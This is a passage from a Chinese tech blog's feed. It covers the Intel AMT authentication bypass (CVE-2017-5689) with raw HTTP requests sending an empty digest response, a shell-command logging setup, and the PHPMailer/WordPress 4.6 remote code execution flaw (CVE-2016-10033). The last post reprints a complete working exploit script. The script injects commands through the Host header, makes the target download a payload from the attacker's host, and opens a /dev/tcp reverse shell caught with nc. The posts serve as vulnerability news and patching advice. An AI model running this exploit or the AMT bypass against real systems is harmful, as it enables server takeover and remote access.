Unauthorized</div><div class="line">WWW-Authenticate: Digest</div><div class="line">realm=»Digest:048A0000000000000000000000000000»,</div><div class="line">nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n»,stale=»false»,qop=»auth»</div><div class="line">Content-Type: text/html</div><div class="line">Server: AMT</div><div class="line">Content-Length: 678</div><div class="line">Connection: close</div><div class="line">GET /index.htm HTTP/1.1</div><div class="line">Host: 127.0.0.1:16992</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101</div><div class="line">Firefox/45.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">Authorization: Digest username=»admin»,</div><div class="line">realm=»Digest:048A0000000000000000000000000000»,</div><div class="line">nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n», uri=»/index.htm», response=»»,</div><div class="line">qop=auth, nc=00000001, cnonce=»60513ab58858482c»</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Thu, 4 May 2017 16:09:17 GMT</div><div class="line">Server: AMT</div><div class="line">Content-Type: text/html</div><div class="line">Transfer-Encoding: chunked</div><div class="line">Cache-Control: no cache</div><div class="line">Expires: Thu, 26 Oct 1995 00:00:00 GMT</div><div class="line">04E6</div></pre></td></tr></table></figure>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者还可以使用Keyboard Video Mouse (KVM)功能，这个功能内置在Intel AMT Web控制平台中，KVM能够让系统管理员远程控制系统，能够执行的操作包括：</p>
<blockquote>
<p>“[攻击者]可以远程加载执行任意程序，读写文件（使用常规的文件管理器）” ，研究人员在<a href="https://www.embedi.com/files/white-papers/Silent-Bob-is-Silent.pdf" target="_blank" rel="external">论文</a>中写道，“使用IDE-R (IDERedirection)，黑客还可以远程更改启动设备，比如吧其他虚拟镜像作为启动设备。”<br>“使用SOL (Serial over LAN), [攻击者]能够远程开关机/重启/重置系统，还可以对BIOS选项进行编辑。”<br>也就是说，黑客可以做任何事情，可以登陆机器、执行恶意活动，包括修改系统和安装那些无法检测的恶意软件。</p>
</blockquote>
<h2 id="升级固件修复系统"><a href="#升级固件修复系统" class="headerlink" title="升级固件修复系统"></a>升级固件修复系统</h2><p>漏洞影响的英特尔管理固件版本包括6.x, 7.x, 8.x 9.x, 10.x, 11.0,11.5和11.6，不过在6以前和11.6以后的版本则不受影响。</p>
<p>英特尔已经将漏洞评级为高危，并且发布了<a href="https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&amp;languageid=en-fr" target="_blank" rel="external">新的固件版本</a>。于此同时，英特尔还发布了一些指导文件，<a href="https://communities.intel.com/docs/DOC-5693" target="_blank" rel="external">一份</a>用于检测工作站是否运行了AMT, ISM或SBT，<a href="https://downloadcenter.intel.com/download/26755" target="_blank" rel="external">一份</a>用于检测系统是否存在漏洞，还有针对不能立即升级的企业的<a href="https://downloadcenter.intel.com/download/26754" target="_blank" rel="external">修复指导</a>。</p>
<p>研究员Bart Blaze在GitHub上也发布了一款简单的<a href="https://github.com/bartblaze/Disable-Intel-AMT" target="_blank" rel="external">修复工具</a>，基于英特尔的指导文件制作。</p>
<p>Cerberus Security在GitHub上也发布了一款<a href="https://github.com/CerberusSecurity/CVE-2017-5689" target="_blank" rel="external">检测AMT漏洞脚本</a>,基于python语言。</p>
<p>受影响的用户只需要下载运行其中的DisableAMT.exe，这个文件会关闭Windows操作系统（x86和x64系统）中的AMT功能。<br><img src="https://camo.githubusercontent.com/07696e4d295aacfaf19fa651c467cc783cbb79d7/687474703a2f2f692e696d6775722e636f6d2f6534444d5845562e706e67" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文章简述&quot;&gt;&lt;a href=&quot;#文章简述&quot; class=&quot;headerlink&quot; title=&quot;文章简述&quot;&gt;&lt;/a&gt;文章简述&lt;/h2&gt;&lt;p&gt;本文讲述英特尔AMT功能远程提权高危漏洞介绍，说明及漏洞验证及修复方法。&lt;/p&gt;
&lt;h2 id=&quot;漏洞说明&quot;&gt;&lt;a href
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Intel AMT 漏洞" scheme="http://blog.unixmen.cn/tags/Intel-AMT-%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Shell实时命令历史记录</title>
    <link href="http://blog.unixmen.cn/2017/05/09/Shell%E5%AE%9E%E6%97%B6%E5%91%BD%E4%BB%A4%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/"/>
    <id>http://blog.unixmen.cn/2017/05/09/Shell实时命令历史记录/</id>
    <published>2017-05-09T08:14:31.000Z</published>
    <updated>2017-05-09T08:17:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h2><p>本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合日志服务器，可把日志传送过去，安全性高。<br>日志记录内容包括：命令执行时间戳，主机名，登陆用户名，PPID，客户端IP地址，执行命令工作目录及执行命令等信息。</p>
<h2 id="安装rsyslog服务"><a href="#安装rsyslog服务" class="headerlink" title="安装rsyslog服务"></a>安装rsyslog服务</h2><ul>
<li><p>安装rsyslog</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install rsyslog</div></pre></td></tr></table></figure>
</li>
<li><p>启动rsyslog</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">systemctl enable rsyslog.service</div><div class="line">systemctl start  rsyslog.service</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><ul>
<li><p>修改/etc/bashrc<br>将以下内容加入到/etc/bashrc文件下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PROMPT_COMMAND=&apos;history -a;command=$(history 1);logger -p local1.notice -t bash -i &quot;user=$USER,ppid=$PPID,from=$SSH_CLIENT,pwd=$PWD,command:$command &quot;&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>修改/etc/rsyslog.conf</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &quot;local1.notice /var/log/.command.log&quot; &gt;&gt;/etc/rsyslog.conf</div></pre></td></tr></table></figure>
</li>
<li><p>重启rsyslog</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart  rsyslog.service</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>如果正常的情况下，在文件 /var/log/.command.log下会记录类似如下格式的日志文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">May  9 15:59:10 localhost bash[8145]: user=root,ppid=18370,from=10.100.0.2 53033 22,pwd=/root,command: 1083  ls -ltr</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文章简述&quot;&gt;&lt;a href=&quot;#文章简述&quot; class=&quot;headerlink&quot; title=&quot;文章简述&quot;&gt;&lt;/a&gt;文章简述&lt;/h2&gt;&lt;p&gt;本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="运维" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E8%BF%90%E7%BB%B4/"/>
    
      <category term="命令行" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E8%BF%90%E7%BB%B4/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
    
      <category term="命令行" scheme="http://blog.unixmen.cn/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"/>
    
      <category term="历史" scheme="http://blog.unixmen.cn/tags/%E5%8E%86%E5%8F%B2/"/>
    
      <category term="history" scheme="http://blog.unixmen.cn/tags/history/"/>
    
      <category term="运维" scheme="http://blog.unixmen.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）</title>
    <link href="http://blog.unixmen.cn/2017/05/05/PHPMailer%E6%9B%9D%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-10033%EF%BC%89/"/>
    <id>http://blog.unixmen.cn/2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/</id>
    <published>2017-05-05T01:33:21.000Z</published>
    <updated>2017-05-09T08:26:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="【2017-5-4更新】"><a href="#【2017-5-4更新】" class="headerlink" title="【2017.5.4更新】"></a>【2017.5.4更新】</h2><p>昨天曝出了两个比较热门的漏洞，一个是CVE-2016-10033，另一个则为CVE-2017-8295。从描述来看，前者是WordPress Core 4.6一个未经授权的RCE漏洞。不过实际上，这就是去年12月份FreeBuf已经报道的漏洞，因此我们在原文基础上进行更新。</p>
<p>这次漏洞公告就是PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。实际上Wordfence当时就曾经提到过该漏洞影响到了WP Core。</p>
<p>最新的这则公告提到了PHP mail()函数的新利用向量，可在MTA – Exim4之上利用该漏洞，Exim在如Debian或Ubuntu等系统中都是默认安装的。这样一来也就增加了此类攻击的范围和漏洞的严重性。具体为利用host字段注入了恶意数据，进入到了mail函数，再利用sendmail (实际上是软连接到的exim4)命令的-be 参数来执行命令。</p>
<p>之所以到现在才公布这部分细节，是期望给予WordPress和其它收到影响的软件提供商更多时间来升级受影响的Mail库。除此之外，也是针对CVE-2017-8295漏洞留出更多的修复时间。</p>
<p>漏洞利用详情参见：<a href="https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html" target="_blank" rel="external">https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html</a></p>
<p>影响范围：</p>
<p>本次公告中提到的RCE PoC基于WordPress 4.6实现，不过其它版本的WordPress也可能受到影响。</p>
<p>视频演示PoC：<a href="https://www.youtube.com/watch?v=ZFt_S5pQPX0" target="_blank" rel="external">https://www.youtube.com/watch?v=ZFt_S5pQPX0</a></p>
<p>更新：PoC代码已经公布，请站长们尽快升级！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">#</div><div class="line"># __ __ __ __ __</div><div class="line"># / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________</div><div class="line"># / / / _ \/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/</div><div class="line"># / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ )</div><div class="line"># /_____/\___/\__, /\__,_/_/ /_/ /_/\__,_/\___/_/|_|\___/_/ /____/</div><div class="line"># /____/</div><div class="line">#</div><div class="line">#</div><div class="line"># WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit</div><div class="line"># CVE-2016-10033</div><div class="line">#</div><div class="line"># wordpress-rce-exploit.sh (ver. 1.0)</div><div class="line">#</div><div class="line">#</div><div class="line"># Discovered and coded by</div><div class="line">#</div><div class="line"># Dawid Golunski (@dawid_golunski)</div><div class="line"># https://legalhackers.com</div><div class="line">#</div><div class="line"># ExploitBox project:</div><div class="line"># https://ExploitBox.io</div><div class="line">#</div><div class="line"># Full advisory URL:</div><div class="line"># https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html</div><div class="line">#</div><div class="line"># Exploit src URL:</div><div class="line"># https://exploitbox.io/exploit/wordpress-rce-exploit.sh</div><div class="line">#</div><div class="line">#</div><div class="line"># Tested on WordPress 4.6:</div><div class="line"># https://github.com/WordPress/WordPress/archive/4.6.zip</div><div class="line">#</div><div class="line"># Usage:</div><div class="line"># ./wordpress-rce-exploit.sh target-wordpress-url</div><div class="line">#</div><div class="line">#</div><div class="line"># Disclaimer:</div><div class="line"># For testing purposes only</div><div class="line">#</div><div class="line">#</div><div class="line"># -----------------------------------------------------------------</div><div class="line">#</div><div class="line"># Interested in vulns/exploitation?</div><div class="line">#</div><div class="line">#</div><div class="line"># .;lc&apos;</div><div class="line"># .,cdkkOOOko;.</div><div class="line"># .,lxxkkkkOOOO000Ol&apos;</div><div class="line"># .&apos;:oxxxxxkkkkOOOO0000KK0x:&apos;</div><div class="line"># .;ldxxxxxxxxkxl,.&apos;lk0000KKKXXXKd;.</div><div class="line"># &apos;:oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl.</div><div class="line"># &apos;&apos;;ldxxxxxdc,. ,oOXXXNNNXd;,.</div><div class="line"># .ddc;,,:c;. ,c: .cxxc:;:ox:</div><div class="line"># .dxxxxo, ., ,kMMM0:. ., .lxxxxx:</div><div class="line"># .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx:</div><div class="line"># .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx:</div><div class="line"># .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx:</div><div class="line"># .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx:</div><div class="line"># .dxxxxxc .cNMMMN.oMMMMx&apos; .xxxxxx:</div><div class="line"># .dxxxxxc lKo;dNMN.oMM0;:Ok. &apos;xxxxxx:</div><div class="line"># .dxxxxxc ;Mc .lx.:o, Kl &apos;xxxxxx:</div><div class="line"># .dxxxxxdl;. ., .. .;cdxxxxxx:</div><div class="line"># .dxxxxxxxxxdc,. &apos;cdkkxxxxxxxx:</div><div class="line"># .&apos;:oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,.</div><div class="line"># .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.</div><div class="line"># .&apos;:oxxxxxxxxx.ckkkkkkkkxl,.</div><div class="line"># .,cdxxxxx.ckkkkkxc.</div><div class="line"># .&apos;:odx.ckxl,.</div><div class="line"># .,.&apos;.</div><div class="line">#</div><div class="line"># https://ExploitBox.io</div><div class="line">#</div><div class="line"># https://twitter.com/Exploit_Box</div><div class="line">#</div><div class="line"># -----------------------------------------------------------------</div><div class="line">rev_host=&quot;192.168.57.1&quot;</div><div class="line">function prep_host_header() &#123;</div><div class="line">cmd=&quot;$1&quot;</div><div class="line">rce_cmd=&quot;\$&#123;run&#123;$cmd&#125;&#125;&quot;;</div><div class="line"># replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;</div><div class="line">#sed &apos;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&apos;</div><div class="line">rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^/^\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\$spool_directory&#125;&#125;^g&apos;`&quot;</div><div class="line"># replace &apos; &apos; (space) with</div><div class="line">#sed &apos;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&apos;</div><div class="line">rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^ ^\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\$tod_log&#125;&#125;^g&apos;`&quot;</div><div class="line">#return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;</div><div class="line">host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;</div><div class="line">return 0</div><div class="line">&#125;</div><div class="line">#cat exploitbox.ans</div><div class="line">intro=&quot;</div><div class="line">DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09r</div><div class="line">bzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19f</div><div class="line">G1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19c</div><div class="line">G1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAg</div><div class="line">IHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19f</div><div class="line">IC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19f</div><div class="line">X19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6</div><div class="line">b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtb</div><div class="line">NUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01N</div><div class="line">TU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1</div><div class="line">QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTsz</div><div class="line">NG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20g</div><div class="line">G1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54</div><div class="line">eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcb</div><div class="line">WzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2RO</div><div class="line">TU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMg</div><div class="line">ICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2Qxtb</div><div class="line">MTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZD</div><div class="line">G1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQob</div><div class="line">WzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1sz</div><div class="line">NG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtb</div><div class="line">MzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19f</div><div class="line">X19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4</div><div class="line">bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;</div><div class="line">intro2=&quot;</div><div class="line">ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09</div><div class="line">fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtb</div><div class="line">MG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAg</div><div class="line">ICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBE</div><div class="line">aXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09</div><div class="line">fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAg</div><div class="line">ICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdh</div><div class="line">bGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBt</div><div class="line">ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBt</div><div class="line">ChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJp</div><div class="line">bGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1</div><div class="line">cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;</div><div class="line">echo &quot;$intro&quot; | base64 -d</div><div class="line">echo &quot;$intro2&quot; | base64 -d</div><div class="line">if [ &quot;$#&quot; -ne 1 ]; then</div><div class="line">echo -e &quot;Usage:\n$0 target-wordpress-url\n&quot;</div><div class="line">exit 1</div><div class="line">fi</div><div class="line">target=&quot;$1&quot;</div><div class="line">echo -ne &quot;\e[91m[*]\033[0m&quot;</div><div class="line">read -p &quot; Sure you want to get a shell on the target &apos;$target&apos; ? [y/N] &quot; choice</div><div class="line">echo</div><div class="line">if [ &quot;$choice&quot; == &quot;y&quot; ]; then</div><div class="line">echo -e &quot;\e[92m[*]\033[0m Guess I can&apos;t argue with that... Let&apos;s get started...\n&quot;</div><div class="line">echo -e &quot;\e[92m[+]\033[0m Connected to the target&quot;</div><div class="line"># Serve payload/bash script on :80</div><div class="line">RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;</div><div class="line">echo &quot;$RCE_exec_cmd&quot; &gt; rce.txt</div><div class="line">python -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;</div><div class="line">hpid=$!</div><div class="line"># Save payload on the target in /tmp/rce</div><div class="line">cmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;</div><div class="line">prep_host_header &quot;$cmd&quot;</div><div class="line">curl -H&quot;Host: $host_header&quot; -s -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword</div><div class="line">echo -e &quot;\n\e[92m[+]\e[0m Payload sent successfully&quot;</div><div class="line"># Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rce</div><div class="line">cmd=&quot;/bin/bash /tmp/rce&quot;</div><div class="line">prep_host_header &quot;$cmd&quot;</div><div class="line">curl -H&quot;Host: $host_header&quot; -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword &amp;</div><div class="line">echo -e &quot;\n\e[92m[+]\033[0m Payload executed!&quot;</div><div class="line">echo -e &quot;\n\e[92m[*]\033[0m Waiting for the target to send us a \e[94mreverse shell\e[0m...\n&quot;</div><div class="line">nc -vv -l 1337</div><div class="line">echo</div><div class="line">else</div><div class="line">echo -e &quot;\e[92m[+]\033[0m Responsible choice ;)  Exiting.\n&quot;</div><div class="line">exit 0</div><div class="line">fi</div><div class="line">echo &quot;Exiting...&quot;</div><div class="line">exit 0</div></pre></td></tr></table></figure>
<p>上述另外一个最新曝出编号为CVE-2017-8295的漏洞，严重程度被评级为介于Medium和High之间（而非Critical），影响到WordPress Core &lt;= 4.7.4以下的版本。</p>
<p>这个漏洞的概况是这样的：WordPress有个密码重置功能，该特性中存在漏洞——在某些情况下可能导致攻击者在无需身份认证的情况下拿到密码重置链接，这样一来攻击者就能获取目标用户的WordPress账户了。</p>
<p>这个漏洞源于WordPress默认在创建密码重置邮件的时候，采用不受信任的数据。具体的利用方式点击这里查看。目前WordPress官方暂无针对该问题的解决方案，可以采用如下临时解决方案：</p>
<p>用户可启用UserCanonicalName实施静态SERVER_NAME值</p>
<p><a href="https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname" target="_blank" rel="external">https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname</a></p>
<p>据作者所说，该问题已经向WordPress安全团队进行过多次反馈，最早一次是在去年7月份，但一直没有得到相应的反馈。</p>
<p>【2016.12.27原文】</p>
<p>这次曝出远程代码执行漏洞的是堪称全球最流行邮件发送类的PHPMailer，据说其全球范围内的用户量大约有900万——每天还在持续增多。</p>
<p>GitHub上面形容PHPMailer“可能是全球PHP发送邮件最流行的代码。亦被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等”。所以这个漏洞影响范围还是比较广的，漏洞级别也为Critical最高级。</p>
<p>漏洞编码</p>
<p>CVE-2016-10033</p>
<p>影响版本</p>
<p>PHPMailer &lt;  5.2.18</p>
